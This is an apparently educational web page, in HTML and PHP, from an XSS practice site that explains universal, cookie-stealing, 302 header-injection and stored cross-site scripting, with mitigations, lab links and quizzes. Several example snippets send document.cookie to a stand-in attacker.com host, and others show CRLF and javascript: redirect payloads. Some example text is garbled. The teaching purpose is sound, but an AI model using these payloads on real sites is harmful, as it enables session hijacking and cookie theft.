<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Inj3ctPractice</title>
    <link rel="stylesheet" href="contentpage.css">
    <style>
        body {
            background-size: cover;
            background-repeat: no-repeat;
            background-attachment: fixed;
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            color: #fff; /* Ensure text is visible on dark background */
        }
        .container {
            display: flex;
            min-height: 100vh; /* Ensure the container spans the full height of the viewport */
        }
        .sidebar {
            width: 150px !important;
            background-color: black;
            color: #fff;
            padding: 20px;
            display: flex;
            flex-direction: column;
            height: 280vh; /* Ensure the sidebar spans the full height of the viewport */
            border-right: 2px solid white;
        }
        .sidebar ul {
            list-style-type: none;
            padding: 0;
            margin: 0;
            flex-grow: 1;
        }
        .sidebar ul li {
            margin-bottom: 10px;
        }
        .sidebar ul li a {
            color: #fff;
            text-decoration: none;
            letter-spacing: 2px;
            line-height: 1;
        }
        .content {
            flex-grow: 1;
            padding: 20px;
            color: #000; /* Black text for better readability on light background */
            background-color: rgba(255, 255, 255, 0.9); /* Light background for content area */
            border-radius: 10px;
            margin: 20px;
            width: 100px;
        }
        .technique {
            margin-bottom: 20px;
            padding: 20px;
            border: 1px solid #ccc;
            border-radius: 10px;
            background-color: #f9f9f9;
        }
        .technique h2 {
            margin-top: 0;
        }
        .button-group {
            margin-top: 20px;
        }
        .button-group button {
            margin-right: 10px;
            margin-bottom: 10px; /* Add margin bottom for spacing */
            padding: 10px 20px;
            border: none;
            background-color: #007BFF;
            color: #fff;
            border-radius: 5px;
            cursor: pointer;
        }
        .example {
            background-color: #333;
            padding: 5px;
            border-radius: 5px;
            margin-top: 10px;
        }
        .example pre {
            margin: 0;
            color: #fff; /* Ensure code text is visible on dark background */
        }   
    </style>
</head>
<body>
    <?php include 'topnavmain.php'; ?>
    <div class="container">
        <div class="sidebar">
            <ul>
                <li><a href="contentpagemain.php">SQL techniques</a></li>
                <li><a href="contentpage2main.php">XSScript techniques</a></li>
            </ul>
        </div>
        
          <div class="content">
            <!-- Technique 1: Universal XSS -->
            <div class="technique" id="technique1">
                <h2>Technique 1: Universal XSS</h2>
                <p>
                    Universal Cross-Site Scripting (UXSS) is a type of Cross-Site Scripting (XSS) attack that targets vulnerabilities within the web browser itself or browser extensions rather than the web application. Unlike traditional XSS attacks that exploit vulnerabilities in web applications to execute malicious scripts in the context of the victim's browser, UXSS attacks leverage flaws in the browser's security mechanisms to achieve the same outcome.
                </p>
                <h3>How does it work?</h3>
                <p>In a UXSS attack, the attacker exploits a security flaw in the browser or browser extensions to execute arbitrary scripts. These scripts can then interact with any web page the victim visits, bypassing the same-origin policy. The same-origin policy is a fundamental security feature that prevents scripts on one origin (domain) from accessing data on another origin without explicit permission.</p>
                <h3>Example</h3>
                <p>When user inputs a base URL (profile.png) and an XSS payload(e.g.,script alert('XSS' script), the script combines both of them to create the exploit URL.</p>
                <div class="example">
                    <pre><code>&lt;img src="profile.png" onerror="document.write('test')" &gt;
                    </code></pre>
                </div>
                <h3>Resulting XSS query</h3>
                <p>In this case would be the provided image (profile.png): <img src = "profile.png"></p>
                <h3>Example Scenario</h3>
                <p>Consider a browser vulnerability that allows an attacker to inject and execute scripts on any webpage the victim visits. Here’s how an attacker might exploit such a vulnerability:</p>
                <p>1. Identify a Vulnerable Browser or Extension:</p>
                <li>The attacker finds a vulnerability in a browser or a widely used browser extension that allows for script injection.</li>
                <p>2. Craft a Malicious Script:</p>
                <li>The attacker creates a malicious script designed to steal cookies, session tokens, or other sensitive information.</li>
                <p>3. Deliver the Payload:</p>
                <li>The attacker lures the victim into visiting a malicious webpage or clicking a malicious link that exploits the browser vulnerability.</li>
                <p>4. Execute the Script:</p>
                <li>Once the victim's browser executes the malicious script, it can interact with any website the victim visits, stealing sensitive information or performing actions on behalf of the victim.</li>
                <h3>UXSS Attack Vectors</h3>
                <p>1. Browser Vulnerabilities:</p>
                <li>Flaws in the browser's handling of certain HTML, JavaScript, or other web technologies can be exploited for UXSS.
                </li>
                <p>2. Browser Extensions:</p>
                <li>Extensions with insufficient security checks or permissions can introduce vulnerabilities that attackers can exploit.</li>
                <p>WebViews in Mobile Apps:</p>
                <li>Some mobile apps use WebViews to display web content, which can introduce UXSS vulnerabilities if not properly secured.</li>
                <h3>Example Exploit</h3>
                <p>Here’s a simplified example to illustrate a potential UXSS exploit:</p>
                <p>1. Vulnerable Extension:</p>
                <li>A browser extension that allows users to modify webpage content but does not properly sanitize user inputs.</li>
                <p>2. Exploit Code:</p>
                                <div class="example">
                    <pre><code>// Malicious script injected via the extension
var img = document.createElement('img');
img.src = 'http://attacker.com/steal-cookie?cookie=' + document.cookie;
document.body.appendChild(img);
                    
                    </code></pre>
                </div>
                <p>3. Impact:</p>
                <li>This script creates an image element with a source URL pointing to the attacker's server, including the victim's cookies as a query parameter. When the script executes, it sends the victim's cookies to the attacker.</li>
                <h3>Mitigation</h3>
                <p>1. Keep Browsers and Extensions Updated:</p>
                <li>Regularly update browsers and extensions to patch known vulnerabilities.</li>
                <p>2. Use Trusted Extensions:</p>
                <li>Only install extensions from trusted sources and with good reviews.</li>
                <p>3. Limit Extension Permissions:</p>
                <li>Be cautious of extensions that request excessive permissions.</li>
                <p>4. Security Audits:</p>
                <li>Conduct regular security audits of browser extensions and applications using WebViews.</li>
                <p>5. Content Security Policy (CSP):</p>
                <li>Implement CSP to restrict the sources from which scripts can be executed.</li>
                <div class="button-group">
                    <form action="universalxss.php" method="get" style="margin: 0;">
                        <button type="submit">Try It Now!</button>
                    </form>
                    <form action="quizstart.php" method="get" style="margin: 0;">
                        <input type="hidden" name="technique" value="XS Script Technique 1">
                        <button type="submit">Attempt Quiz</button>
                    </form>
                </div>
            </div>

            <!-- Technique 2: Cookie XSS -->
            <div class="technique" id="technique2">
               <h2>Technique 2: Cookie XSS</h2>
                <p>Cookie-based Cross-Site Scripting (XSS) involves an attacker exploiting vulnerabilities in a web application to execute malicious scripts, which then steal cookies from the victim's browser. Cookies often store sensitive information like session tokens, which, if stolen, can lead to account hijacking and other malicious activities.</p>
                <h3>How Cookie-Based XSS Works</h3>
                <p>1. Identify a Vulnerability:</p>
                <li>The attacker identifies an XSS vulnerability in a web application. This could be a reflected, stored, or DOM-based XSS vulnerability.</li>
                <p>2. Craft Malicious Script:</p>
                <li>The attacker crafts a malicious script designed to steal cookies. This script typically sends the cookie data to a server controlled by the attacker.</li>
                <p>3. Inject the Script:</p>
                <li>The attacker injects the malicious script into the web application. In a reflected XSS attack, this could involve sending a specially crafted URL to the victim. In a stored XSS attack, the script is stored on the server and served to users. In a DOM-based XSS attack, the script is executed on the client side.</li>
                <p>4. Execute the Script:</p>
                <li>When the victim visits the compromised webpage, the malicious script executes in their browser.</li>
                <p>5. Steal Cookies:</p>
                <li>The script accesses the victim's cookies and sends them to the attacker's server.</li>
                
                <h3>Example</h3>
                <div class="example">
                    <pre><code>&lt;script&gt;
    var img = new Image();
    img.src = "http://attacker.com/steal?cookie=" + document.cookie;
&lt;/script&gt;
                    </code></pre>
                </div>
                <h3>Example Scenario</h3>
                <p>1. Vulnerable Web Application:</p>
                <li>The attacker discovers that a web application does not properly sanitize user inputs and is vulnerable to XSS.</li>
                <p>2. Crafting the Payload:</p>
                <li>The attacker creates a URL with a malicious script embedded in it:</li>
                <div class="example">
                    <pre><code>
http://vulnerable-site.com/search?q=document.location='http://attacker.com/steal?cookie='+document.cookie
                    
                    </code></pre>
                </div>
                <p>3. Delivering the Payload:</p>
                <li>The attacker sends the URL to the victim, perhaps via email or social media.</li>
                <p>4. Executing the Payload:</p>
                <li>The victim clicks the link, and the script executes, stealing the victim's cookies and sending them to the attacker's server:</li>
                <div class="example">
                    <pre><code>
var img = document.createElement('img');
img.src = 'http://attacker.com/steal?cookie=' + document.cookie;
document.body.appendChild(img);

                    
                    </code></pre>
                </div>
                <h3>Types of XSS</h3>
                <p>1. Reflected XSS:</p>
                <li>The script is reflected off a web server, such as in an error message or search result, and is immediately executed by the victim's browser.</li>
                <p>2. Stored XSS:</p>
                <li>The script is stored on the target server, such as in a forum post or user profile, and executed when a victim loads the affected page.</li>
                <p>3. DOM-Based XSS:</p>
                <li>The script is executed as a result of modifying the DOM environment in the victim's browser.</li>
                <h3>Mitigation</h3>
                <p>1. Input Sanitization and Validation:</p>
                <li>Always sanitize and validate inputs on both the client and server sides to prevent malicious scripts from being injected.</li>
                <p>2. Use HttpOnly Cookies:</p>
                <li>Mark cookies with the HttpOnly attribute to prevent access via JavaScript.</li>
                <p>3. Content Security Policy (CSP):</p>
                <li>Implement a CSP to restrict the sources from which scripts can be executed.</li>
                <p>4. Escape Data in HTML Contexts:</p>
                <li>Ensure that data inserted into HTML is properly escaped to prevent script execution.</li>
                <p>5. SameSite Cookies:</p>
                <li>Use the SameSite attribute for cookies to prevent them from being sent with cross-site requests.</li>
                <div class="button-group">
                    <form action="cookiexss.php" method="get" style="margin: 0;">
                        <button type="submit">Try It Now!</button>
                    </form>
                    <form action="quizstart.php" method="get" style="margin: 0;">
                        <input type="hidden" name="technique" value="XS Script Technique 2">
                        <button type="submit">Attempt Quiz</button>
                    </form>
                </div>
            </div>

            <!-- Technique 3: XSS with Header Injection in a 302 Response -->
            <div class="technique" id="technique3">
                <h2>Technique 3: XSS with Header Injection in a 302 Response</h2>
                <p>Cross-Site Scripting (XSS) with header injection in a 302 response is an advanced attack where the attacker injects malicious content into HTTP headers that are returned to the client's browser. When the browser processes these headers, it can execute the malicious script, leading to various harmful consequences.</p>
                <h3>How does it work?</h3>
                <p>1. Identify a Vulnerability:</p>
                <li>The attacker finds an input field in the web application that can be used to inject HTTP headers, specifically in the Location header of a 302 redirect response.</li>
                <p>2. Craft Malicious Script:</p>
                <li>The attacker crafts a script that will be executed when the browser processes the response. The script is typically included in the URL specified in the Location header.</li>
                <p>3. Inject the Script:</p>
                <li>The attacker sends a request to the vulnerable web application, injecting the malicious script into a parameter that ends up in the Location header.</li>
                <p>4. 302 Response:</p>
                <li>The server responds with a 302 redirect, including the malicious Location header.</li>
                <p>5. Script Execution:</p>
                <li>The victim's browser processes the 302 response and executes the script embedded in the Location header.</li>
                <h3>Example</h3>
                <div class="example">
                    <pre><code>https://example.com
                    </code></pre>
                </div>
                <p>When the URL is submitted, the script constructs an exploit URL ($exploit_url) by appending %0d%0aContent-Length:0%0d%0a%0d%0a script alert('XSS');script to the user-provided URL.</p>
                <div class="example">
                    <pre><code>https://https://example.com%0d%0aContent-Length:0%0d%0a%0d%0a

                    </code></pre>
                </div>
                <p>The script then outputs the generated exploit URL ($exploit_url) in a div class='output' and a clickable link that directs the user to the generated exploit URL.</p>
                <div class="example">
                    <pre><code>Click here to trigger XSS
                    </code></pre>
                </div>
                
                <h3>Example Scenario</h3>
                <p>1. Vulnerable Web Application:</p>
                <li>Suppose a web application has a redirect functionality where the Location header of a 302 response is dynamically set based on user input, without proper sanitization.</li>
                <p>2. Crafting the Payload:</p>
                <li>The attacker crafts a URL to inject a malicious script into the Location header. For instance:</li>
                 <div class="example">
                    <pre><code>http://vulnerable-site.com/redirect?url=javascript:alert('XSS')
                    
                    </code></pre>
                </div>
                <p>3. Delivering the Payload:</p>
                <li>The attacker sends this URL to a victim or places it in a location where the victim will click it.</li>
                <p>4. Processing the Request:</p>
                <li>The web application processes the request and sets the Location header in the 302 response based on the url parameter:</li>
                <div class="example">
                    <pre><code>HTTP/1.1 302 Found
Location: javascript:alert('XSS')
                    
                    
                    </code></pre>
                </div>
                <p>5. Executing the Script:</p>
                <li>The victim's browser receives the 302 response and executes the script in the Location header, leading to an alert with 'XSS'.</li>
                <h3>Mitigation</h3>
                <p>1. Sanitize and Validate Input:</p>
                <li>Ensure that any input used to construct headers is properly sanitized and validated to prevent injection of malicious content.</li>
                <p>2. Use Safe Redirects:</p>
                <li>Use a whitelist of allowed URLs for redirection to prevent arbitrary input from being used in the Location header.</li>
                <p>3. Encode Output Properly:</p>
                <li>Properly encode the values used in HTTP headers to prevent script execution.</li>
                <p>4. Content Security Policy (CSP):</p>
                <li>Implement a strong CSP to restrict the execution of inline scripts.</li>
                <p>5. Secure Coding Practices:</p>
                <li>Follow secure coding practices and use libraries that handle URL and header construction securely.</li>
                <div class="button-group">
                    <form action="headerxss.php" method="get" style="margin: 0;">
                        <button type="submit">Try It Now!</button>
                    </form>
                    <form action="quizstart.php" method="get" style="margin: 0;">
                        <input type="hidden" name="technique" value="XS Script Technique 3">
                        <button type="submit">Attempt Quiz</button>
                    </form>
                </div>
            </div>

            <!-- Technique 4: Stored XSS -->
            <div class="technique" id="technique4">
                <h2>Technique 4: Stored XSS</h2>
                <p>Stored XSS, also known as persistent XSS, is a type of cross-site scripting attack where the malicious script is permanently stored on the target server, such as in a database, comment field, or forum post. When other users visit the affected page, the script is served to their browsers and executed.</p>
                <h3>How Stored XSS Works</h3>
                <p>1. Identify a Vulnerability:</p>
                <li>The attacker identifies an input field on a web application that does not properly sanitize or validate user input before storing it.</li>
                <p>2. Inject Malicious Script:</p>
                <li>The attacker inputs malicious JavaScript code into the vulnerable field, which gets stored in the database or another persistent storage.</li>
                <p>3. Stored Script Delivered to Users:</p>
                <li>When other users access the affected page, the web application retrieves the stored data and includes it in the page's HTML without proper encoding.</li>
                <p>4. Script Execution:</p>
                <li>The malicious script is executed in the context of the victim's browser, potentially leading to data theft, session hijacking, or other malicious actions.</li>
                
                <h3>Example</h3>
                <div class="example">
                    <pre><code>&lt;script&gt;alert('Stored XSS');&lt;/script&gt;
                    </code></pre>
                </div>
                <h3>Example Scenario</h3>
                <p>1. Vulnerable Comment System:</p>
                <li>A web application has a comment system where users can post comments on articles. The comments are stored in a database and displayed to other users when they visit the article page.</li>
                <p>2. Injection of Malicious Script:</p>
                <li>An attacker posts a comment containing a malicious script:</li>
                <div class="example">
                    <pre><code>alert('XSS');
                    </code></pre>
                </div>
                <p>3. Storing the Malicious Script:</p>
                <li>The web application stores the comment in the database without sanitizing the input.</li>
                <p>4. Displaying the Stored Comment:</p>
                <li>When other users view the article page, the web application retrieves the comment from the database and includes it in the HTML response:</li>
                 <div class="example">
                    <pre><code>
div class="comment"
alert('XSS');
div
 </code></pre>
                </div>
                <p>5. Script Execution:</p>
                <li>The victim's browser executes the script, displaying an alert with the message 'XSS'.</li>
                <h3>Impact of Stored XSS</h3>
                <p>1. Data Theft:</p>
                <li>Attackers can steal sensitive information such as cookies, session tokens, or user input data.</li>
                <p>2. Session Hijacking:</p>
                <li>Attackers can capture session cookies to impersonate users.</li>
                <p>3. Defacement:</p>
                <li>Attackers can modify the appearance of the web page, causing reputational damage.</li>
                <p>4. Malware Distribution:</p>
                <li>Attackers can redirect users to malicious sites or load malicious scripts that download malware.</li>
                <h3>Mitigation</h3>
                <p>1. Input Sanitization:</p>
                <li>Sanitize user input to remove or neutralize any potentially harmful code.</li>
                <p>2. Output Encoding:</p>
                <li>Properly encode output when displaying user-generated content to prevent script execution.</li>
                <p>3. Content Security Policy (CSP):</p>
                <li>Implement a strong CSP to restrict the execution of inline scripts and resources.</li>
                <p>4. Validation and Whitelisting:</p>
                <li>Validate and whitelist user input to ensure only allowed characters and formats are accepted.</li>
                <p>5. Security Libraries and Frameworks:</p>
                <li>Use security libraries and frameworks that provide built-in protection against XSS.</li>
                <h3>Example of Preventive Measures</h3>
                <p>Sanitizing Input</p>
                <div class="example">
                    <pre><code>$comment = htmlspecialchars($_POST['comment'], ENT_QUOTES, 'UTF-8');
                    </code></pre>
                </div>
                <p>Encoding Output</p>
                <div class="example">
                    <pre><code>echo 'div class="comment"' . htmlspecialchars($comment, ENT_QUOTES, 'UTF-8') . '/div>';
                    </code></pre>
                </div>
                <div class="button-group">
                    <form action="xss.php" method="get" style="margin: 0;">
                        <button type="submit">Try It Now!</button>
                    </form>
                    <form action="quizstart.php" method="get" style="margin: 0;">
                        <input type="hidden" name="technique" value="XS Script Technique 4">
                        <button type="submit">Attempt Quiz</button>
                    </form>
                </div>
            </div>
        </div>
    </div>
    <script src="scripts.js"></script>
</body>
</html>
